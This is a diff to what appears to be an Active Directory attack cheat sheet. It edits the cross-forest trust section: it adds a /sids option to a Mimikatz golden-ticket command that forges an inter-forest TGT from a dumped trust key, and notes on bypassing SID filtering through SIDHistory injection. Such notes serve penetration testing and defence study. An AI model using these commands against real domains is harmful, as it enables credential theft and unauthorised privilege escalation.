@@ -23,7 +23,7 @@
 * [Cross Forest attacks](#Crossforest-attacks)
   * [Kerberoast](#Kerberoast2)
   * [Printer Bug](#Printer-bug2) 
-  * [Trust flow](#Trust-flow) 
+  * [Trust key](#Trust-key) 
   * [Trust abuse SQL](#Trust-abuse-SQL)
   * [Foreign Security Principals](#Foreign-Security-Principals)
   * [ACLs](#ACLs)
@@ -642,7 +642,7 @@ netdom trust <CURRENT FOREST> /domain:<TRUSTED FOREST> /EnableTgtDelegation
 
 See [Printer Bug](#Printer-bug) for exploitation
 
-### Trust flow
+### Trust key
 -  By abusing the trust flow between forests in a two way trust, it is possible to access resources across the forest boundary which are explicity shared with a specific forest.
 -  There is no way to enumerate which resources are shared.
 
@@ -656,7 +656,7 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 
 #### Create a intern-forest TGT
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /rc4:<HASH OF TRUST KEY> /service:krbtgt /target:<TARGET FOREST> /ticket:<KIRBI FILE>"'
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /rc4:<HASH OF TRUST KEY> /service:krbtgt /target:<TARGET FOREST> /sids:<SIDS> /ticket:<KIRBI FILE>"'
 ```
 
 #### Create and inject TGS
@@ -682,7 +682,10 @@ dir \\<SERVER NAME>\<SHARE>\
 ```
 
 ### SID history enabled
+- This is fine but why can't we access all resources just like Intra forest?
+- SID Filtering is the answer. It filters high privilege SIDs from the SIDHistory of a TGT crossing forest boundary. This means we cannot just go ahead and access resources in the trusting forest as an Enterprise Admin.
 - If a external trust has SID history enabled. It is possible to inject a SIDHistory for RID => 1000 (higher then 1000) to access resources accessible to that identity or group in the target trusting forest. Needs to be user created!
+- This means, if we have an external trust (or a forest trust with SID history enabled /enablesidhistory:yes), we can inject a SIDHistory for RID > 1000 to access resources accessible to that identity or group in the target trusting forest. 
 
 #### Enumerate if SIDFilteringForestAware is enabled
 - Run on the DC.
